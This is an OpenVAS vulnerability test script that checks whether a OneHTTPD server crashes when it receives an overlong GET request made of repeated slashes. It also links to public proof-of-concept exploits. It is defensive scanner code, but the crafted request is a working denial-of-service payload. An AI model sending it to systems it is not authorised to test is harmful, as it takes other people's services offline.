###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_onehttpd_server_remote_dos_vuln.nasl 11402 2018-09-15 09:13:36Z cfischer $
#
# OneHTTPD HTTP Server Remote Denial of Service Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803798");
  script_version("$Revision: 11402 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 11:13:36 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2014-02-10 14:48:46 +0530 (Mon, 10 Feb 2014)");
  script_name("OneHTTPD HTTP Server Remote Denial of Service Vulnerability");

  script_tag(name:"summary", value:"This host is running OneHTTPD HTTP Server and is prone to denial of
  service vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP GET request and check whether it
  is able to crash or not.");
  script_tag(name:"insight", value:"The flaw is due to an error when processing certain long requests and can
  be exploited to cause a denial of service via a specially crafted packet.");
  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to cause the application
  to crash, creating a denial-of-service condition.");
  script_tag(name:"affected", value:"OneHTTPD versions 0.7 and 0.8");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/31522");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/windows/onehttpd-08-crash-poc");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("onehttpd/banner");

  exit(0);
}


include("http_func.inc");

oneHttpdPort = get_http_port(default:8080);

oneHttpdBanner = get_http_banner(port: oneHttpdPort);
if(!oneHttpdBanner || "Server: onehttpd/" >!< oneHttpdBanner) exit(0);

if(http_is_dead(port:oneHttpdPort)) exit(0);

oneHttpdReq = http_get(item:string("/",crap(length:245, data:"/")),
                       port:oneHttpdPort);

## Send crafted request
oneHttpdRes = http_send_recv(port:oneHttpdPort, data:oneHttpdReq);

if(http_is_dead(port:oneHttpdPort)){
  security_message(oneHttpdPort);
  exit(0);
}

exit(99);
